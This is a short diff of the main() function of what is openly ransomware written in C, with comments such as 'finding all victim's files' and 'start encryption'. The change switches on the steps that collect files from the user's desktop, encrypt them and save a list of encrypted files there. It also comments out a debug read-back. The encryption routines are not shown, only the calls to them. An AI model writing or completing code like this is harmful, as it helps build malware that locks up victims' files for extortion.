@@ -18,24 +18,23 @@ int main(){
     char * home = get_home_enviroment();
     char * desktop = get_desktop_enviroment(home);
     char * username = get_username();
-    char *trash = get_trash_path(home);
-    char *media = get_media_path(username);
+    char * trash = get_trash_path(home);
+    char * media = get_media_path(username);
 
-    // finding all victim's files
-    //find_files(&files, desktop);
+	  // finding all victim's files
+    find_files(&files, desktop);
     //find_files(&files, trash);
     //find_files(&files, media);
 
     // start encryption
-    //encrypt_files(files, &encrypted, &not_encrypted);
-    //save_into_file_encrypted_list(encrypted, desktop);
+    encrypt_files(files, &encrypted, &not_encrypted);
+    save_into_file_encrypted_list(encrypted, desktop);
     //destroy(&encrypted);
-    read_from_file_encrypted_files(&encrypted, desktop);
-    print(encrypted);
+    //read_from_file_encrypted_files(&encrypted, desktop);
+    //print(encrypted);
     //print(encrypted);
     //destroy(&files);
     //destroy_encrypted_list(&encrypted);
 
     return 0;
 }
-
